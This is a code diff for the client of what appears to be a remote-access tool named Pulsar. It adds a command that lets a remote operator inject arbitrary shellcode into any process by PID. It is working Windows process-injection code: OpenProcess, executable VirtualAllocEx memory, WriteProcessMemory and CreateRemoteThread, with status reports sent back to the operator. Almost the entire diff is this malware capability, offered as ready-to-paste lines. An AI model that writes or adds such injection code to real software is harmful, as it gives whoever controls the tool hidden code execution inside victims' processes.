@@ -47,7 +47,8 @@ namespace Pulsar.Client.Messages
             message is DoProcessDump ||
             message is DoSetTopMost ||
             message is DoSuspendProcess ||
-            message is DoSetWindowState;
+            message is DoSetWindowState ||
+            message is DoInjectShellcodeIntoProcess; // Add this line
 
         public bool CanExecuteFrom(ISender sender) => true;
 
@@ -68,6 +69,128 @@ namespace Pulsar.Client.Messages
                 case DoSuspendProcess msg: Execute(sender, msg); break;
                 case DoSetTopMost msg: Execute(sender, msg); break;
                 case DoSetWindowState msg: Execute(sender, msg); break;
+                case DoInjectShellcodeIntoProcess msg: Execute(sender, msg); break; // Add this line
+            }
+        }
+
+        private bool InjectShellcodeIntoProcess(Process targetProcess, byte[] shellcode)
+        {
+            IntPtr processHandle = IntPtr.Zero;
+            IntPtr allocatedMemory = IntPtr.Zero;
+            IntPtr threadHandle = IntPtr.Zero;
+
+            try
+            {
+                // Open the target process with necessary permissions
+                processHandle = Utilities.NativeMethods.OpenProcess(
+                    Utilities.NativeMethods.ProcessAccessFlags.VM_OPERATION |
+                    Utilities.NativeMethods.ProcessAccessFlags.VM_WRITE |
+                    Utilities.NativeMethods.ProcessAccessFlags.CREATE_THREAD |
+                    Utilities.NativeMethods.ProcessAccessFlags.QUERY_INFORMATION,
+                    false, (uint)targetProcess.Id);
+
+                if (processHandle == IntPtr.Zero)
+                {
+                    SendStatus($"Failed to open process handle (Error: {Marshal.GetLastWin32Error()})");
+                    return false;
+                }
+
+                // Allocate memory in the target process
+                allocatedMemory = Utilities.NativeMethods.VirtualAllocEx(
+                    processHandle,
+                    IntPtr.Zero,
+                    (uint)shellcode.Length,
+                    Utilities.NativeMethods.AllocationType.Commit | Utilities.NativeMethods.AllocationType.Reserve,
+                    Utilities.NativeMethods.MemoryProtection.ExecuteReadWrite);
+
+                if (allocatedMemory == IntPtr.Zero)
+                {
+                    SendStatus($"Failed to allocate memory in target process (Error: {Marshal.GetLastWin32Error()})");
+                    return false;
+                }
+
+                // Write shellcode to allocated memory
+                bool writeSuccess = Utilities.NativeMethods.WriteProcessMemory(
+                    processHandle,
+                    allocatedMemory,
+                    shellcode,
+                    (uint)shellcode.Length,
+                    out _);
+
+                if (!writeSuccess)
+                {
+                    SendStatus($"Failed to write shellcode to target process (Error: {Marshal.GetLastWin32Error()})");
+                    return false;
+                }
+
+                // Create remote thread to execute the shellcode
+                threadHandle = Utilities.NativeMethods.CreateRemoteThread(
+                    processHandle,
+                    IntPtr.Zero,
+                    0,
+                    allocatedMemory,
+                    IntPtr.Zero,
+                    0,
+                    out _);
+
+                if (threadHandle == IntPtr.Zero)
+                {
+                    SendStatus($"Failed to create remote thread (Error: {Marshal.GetLastWin32Error()})");
+                    return false;
+                }
+
+                // Wait for thread to complete (optional - you might want to remove this for async execution)
+                Utilities.NativeMethods.WaitForSingleObject(threadHandle, 0xFFFFFFFF);
+
+                return true;
+            }
+            catch (Exception ex)
+            {
+                SendStatus($"Injection error: {ex.Message}");
+                return false;
+            }
+            finally
+            {
+                // Clean up handles
+                if (threadHandle != IntPtr.Zero) Utilities.NativeMethods.CloseHandle(threadHandle);
+                if (allocatedMemory != IntPtr.Zero) Utilities.NativeMethods.VirtualFreeEx(processHandle, allocatedMemory, 0, Utilities.NativeMethods.FreeType.Release);
+                if (processHandle != IntPtr.Zero) Utilities.NativeMethods.CloseHandle(processHandle);
+            }
+        }
+        private void Execute(ISender client, DoInjectShellcodeIntoProcess message)
+        {
+            try
+            {
+                SendStatus($"Injecting shellcode into process PID: {message.ProcessId}");
+
+                if (message.Shellcode == null || message.Shellcode.Length == 0)
+                {
+                    SendStatus("Shellcode injection failed: Empty shellcode");
+                    return;
+                }
+
+                Process targetProcess = Process.GetProcessById(message.ProcessId);
+                if (targetProcess == null)
+                {
+                    SendStatus($"Shellcode injection failed: Process PID {message.ProcessId} not found");
+                    return;
+                }
+
+                // Perform the injection
+                bool success = InjectShellcodeIntoProcess(targetProcess, message.Shellcode);
+
+                if (success)
+                {
+                    SendStatus($"Shellcode successfully injected into PID {message.ProcessId} ({targetProcess.ProcessName})");
+                }
+                else
+                {
+                    SendStatus($"Shellcode injection failed for PID {message.ProcessId}");
+                }
+            }
+            catch (Exception ex)
+            {
+                SendStatus($"Shellcode injection error for PID {message.ProcessId}: {ex.Message}");
             }
         }
         private void Execute(ISender client, DoProcessEnd message)
